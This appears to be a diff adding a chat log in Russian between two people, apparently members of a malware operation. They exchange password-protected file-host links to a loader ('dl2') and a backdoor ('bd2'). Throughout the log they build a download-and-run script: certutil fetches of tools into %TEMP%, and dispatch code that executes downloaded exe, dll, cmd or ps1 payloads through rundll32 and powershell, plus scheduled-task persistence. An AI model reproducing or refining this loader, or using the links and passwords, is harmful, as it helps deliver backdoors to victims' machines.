@@ -1,0 +1,107 @@
+Timestamp	From	To	Message
+2020-09-08 15:32:15.835345	mushroom	dandis	Привет:
+bd2:
+Download: https://qaz.im/load/fNzF2z/73aKke   
+Delete: https://qaz.im/index.php?a=delete&q=679421896
+Пароль: 4C>!f.~<U:$z&J:O,
+2020-09-08 15:32:33.468555	mushroom	dandis	dl2:
+Download: https://qaz.im/load/kf2SFS/kAziR8   
+Delete: https://qaz.im/index.php?a=delete&q=956444246
+Пароль: (~nIZ'CG)iwq""AN"
+2020-09-08 15:32:55.969676	mushroom	dandis	Для тестов Буза сказал тебе дать.
+2020-09-08 15:33:16.507889	mushroom	dandis	dl2 загрузчик, bd2 бэкдор.
+2020-09-08 15:33:45.547440	mushroom	dandis	Запускаешь dl2.exe он скачивает бэкдор и запускает его. Группа two.
+2020-09-08 15:33:59.782416	mushroom	dandis	Сейчас там загружены все версии с логами.
+2020-09-08 15:50:37.130532	mushroom	dandis	Связь работает?
+2020-10-02 10:46:33.062698	mushroom	dandis	Привет. Пришли мне мой сценарий curldowload.cmd, я у себя его удалил по ошибке.
+2020-10-02 11:06:28.711291	mushroom	dandis	Сделал exe, dll, cmd, ps1.
+2020-10-02 12:01:16.574207	dandis	mushroom	Привет
+2020-10-02 12:03:27.216673	dandis	mushroom	
+@echo off
+
+setlocal
+set an="%TEMP%\%RANDOM%.zip"
+certutil -urlcache -split -f "https://curl.haxx.se/windows/dl-7.72.0_3/curl-7.72.0_3-win32-mingw.zip" %an%
+
+set uz="%TEMP%\%RANDOM%.exe"
+certutil -urlcache -split -f "http://stahlworks.com/dev/unzip.exe" %uz%
+
+set ud="%TEMP%\%RANDOM%"
+%uz% -qq %an% -d "%ud%"
+del /q %uz%
+
+del /q %an%
+where /r "%ud%" curl.exe
+endlocal
+2020-10-02 12:03:38.754528	dandis	mushroom	
+» > Сделал exe, dll, cmd, ps1. 
+В один файл это можно запихать?
+2020-10-02 12:03:45.079554	dandis	mushroom	Как и длл с ехе
+2020-10-02 12:04:17.600135	mushroom	dandis	И как понять что запускать, аргументы командной строки использовать?
+2020-10-02 12:07:56.752876	mushroom	dandis	Сейчас сделаю. В начале сценария будет set type=
+2020-10-02 12:08:10.762613	mushroom	dandis	там можео будет выбрать exe,dll,cmd,ps1
+2020-10-02 12:09:29.065440	dandis	mushroom	Суть в том, что мне надо поддержку всех 4 вариантов в одном файле
+2020-10-02 12:09:38.465277	dandis	mushroom	Либо вешать 4 schtashs на файл?
+2020-10-02 12:09:44.883643	dandis	mushroom	И они по 4 раза будут стучать на урл?
+2020-10-02 12:10:18.670237	mushroom	dandis	Так скачивать будет один?
+2020-10-02 12:10:27.688186	mushroom	dandis	И запускать один файл.
+2020-10-02 12:10:55.482359	mushroom	dandis	Надо чтобы он сам понял что за тип файла скачал?
+2020-10-02 12:11:37.681493	dandis	mushroom	Да
+2020-10-02 12:12:09.102426	mushroom	dandis	Это не получиться отличит cmd от ps1 например точно.
+2020-10-02 12:12:46.219231	mushroom	dandis	По ссылке можно отличить если в ней указано расширение файла.
+2020-10-02 12:13:07.702345	mushroom	dandis	Например localhost/static/TestOutput64.cmd
+2020-10-02 12:13:13.074857	mushroom	dandis	localhost/static/TestOutput64.ps1
+2020-10-02 12:13:16.866203	mushroom	dandis	localhost/static/TestOutput64.exe
+2020-10-02 12:13:21.626649	mushroom	dandis	localhost/static/TestOutput64.dll
+2020-10-02 12:13:39.692775	mushroom	dandis	Такие ссылки для скачивания например, или нет?
+2020-10-02 12:14:29.107924	mushroom	dandis	Или такие localhost/static/HOWEOIFH023
+2020-10-02 12:14:44.775941	mushroom	dandis	localhost/static/nf20[93hf30=8§h
+2020-10-02 12:14:56.644307	mushroom	dandis	И тогда не понятно какой файл скачиваешь.
+2020-10-02 12:15:51.906933	dandis	mushroom	
+» [08:13:06] <mushroom> Например localhost/static/TestOutput64.cmd 
+» [08:13:11] <mushroom> localhost/static/TestOutput64.ps1 
+» [08:13:15] <mushroom> localhost/static/TestOutput64.exe 
+» [08:13:20] <mushroom> localhost/static/TestOutput64.dll
+2020-10-02 12:15:52.579819	dandis	mushroom	Да
+2020-10-02 12:16:04.154098	mushroom	dandis	Тогда сделаю.
+2020-10-02 13:11:42.016816	mushroom	dandis	Вот:
+Download: https://qaz.im/load/FfG96E/yhbRhF   
+Delete: https://qaz.im/index.php?a=delete&q=899814883
+Пароль: |]`,d@'RQfk7Nua`Q
+2020-10-02 13:12:07.795200	mushroom	dandis	Один для всех запусков это download_run.cmd
+2020-10-05 08:43:58.962086	mushroom	dandis	Привет. Что по сценариям?
+2020-10-05 08:44:58.848369	dandis	mushroom	Привет, перешли последний еще разок
+2020-10-05 08:45:49.023746	mushroom	dandis	Download: https://qaz.im/load/FfG96E/yhbRhF   
+Delete: https://qaz.im/index.php?a=delete&q=899814883
+Пароль: |]`,d@'RQfk7Nua`Q
+2020-10-05 08:46:05.416233	mushroom	dandis	Значит ещё не проверял.
+2020-10-05 08:46:18.198573	dandis	mushroom	Пусто
+2020-10-05 08:46:46.458262	mushroom	dandis	Ссылка?
+2020-10-05 08:47:20.684882	dandis	mushroom	Файло 0б
+2020-10-05 08:50:22.459183	mushroom	dandis	Download: https://qaz.im/load/a87zyT/7YfAbb   
+Delete: https://qaz.im/index.php?a=delete&q=1002403784
+Пароль: :}bjH*S5JIjlqVA1]
+2020-10-05 08:56:06.375534	dandis	mushroom	Download_run запускает файл в зависимости от типа?
+2020-10-05 08:56:45.802560	mushroom	dandis	Да. В зависимости от того что в ссылке на конце (exe, dll, cmd, bat, ps1).
+2020-10-05 08:57:29.109486	dandis	mushroom	А как он определяет что в конце ссылки?
+2020-10-05 08:58:12.256109	mushroom	dandis	По последним 3 символам.
+2020-10-05 08:58:24.780662	mushroom	dandis	http://localhost/static/example.exe
+2020-10-05 08:58:31.591943	mushroom	dandis	на конце exe
+2020-10-05 08:58:43.529606	mushroom	dandis	http://localhost/static/example.dll
+2020-10-05 08:58:51.297495	mushroom	dandis	Типа так.
+2020-10-05 09:06:12.927390	dandis	mushroom	А нельзя было бы сделать унифицированный урл?
+2020-10-05 09:07:06.533975	mushroom	dandis	Тогда не понять что за тип файла запускать. Они немного по разному запускаются.
+2020-10-05 09:07:22.794195	mushroom	dandis	if %e%==exe %df% %args%
+if %e%==dll rundll32 %df%,%args%
+if %e%==cmd call %df% %args%
+if %e%==bat call %df% %args%
+if %e%==ps1 powershell -File %df% %args%
+2020-10-05 09:07:39.127658	mushroom	dandis	Немного по разному запускается каждый тип файла.
+2020-10-05 09:08:33.395462	mushroom	dandis	Можно отличить exe от dll и от сценариев, но bat от ps1 никак не отличить. И там и там просто набор слов.
+2020-10-05 09:09:08.563927	mushroom	dandis	[08:13:06] <mushroom> Например localhost/static/TestOutput64.cmd 
+» [08:13:11] <mushroom> localhost/static/TestOutput64.ps1 
+» [08:13:15] <mushroom> localhost/static/TestOutput64.exe 
+» [08:13:20] <mushroom> localhost/static/TestOutput64.dll 
+
+[15:15:52] <doomsday> Да
+2020-10-05 09:09:23.654499	mushroom	dandis	Ты писал что ссылки такими будут.
